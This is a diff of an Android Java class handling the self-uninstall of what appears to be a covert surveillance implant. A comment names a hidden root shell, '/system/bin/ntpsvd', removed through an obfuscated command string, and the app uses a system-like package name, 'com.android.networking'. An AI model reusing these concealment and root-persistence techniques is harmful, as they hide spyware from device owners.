@@ -59,17 +59,17 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
 		}
-		
+
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
 
 		if (Status.self().haveRoot() == true) {
 			Process localProcess;
-			
+
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
 				localProcess = Runtime.getRuntime().exec(Messages.getString("32.32"));
-				
+
 				localProcess.waitFor();
 			} catch (Exception e) {
 				if (Cfg.EXP) {
@@ -77,9 +77,9 @@ public class UninstallAction extends SubActionSlow {
 				}
 			}
 		}
-		
+
 		boolean ret = stopServices();
-		
+
 		ret &= removeFiles();
 		ret &= deleteApplication();
 
@@ -131,10 +131,14 @@ public class UninstallAction extends SubActionSlow {
 			Check.log(TAG + " (deleteApplication)");//$NON-NLS-1$
 		}
 
-		//Core core = Core.self();
-		
-		final Uri packageURI = Uri.parse(Messages.getString("2.0")); //$NON-NLS-1$
+		// Core core = Core.self();
+		// Messages.getString("2.0") : 2.0=package:com.android.networking
+		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (deleteApplication): " + packageURI.toString());
+		}
+		
 		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
 		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		Status.getAppContext().startActivity(uninstallIntent);
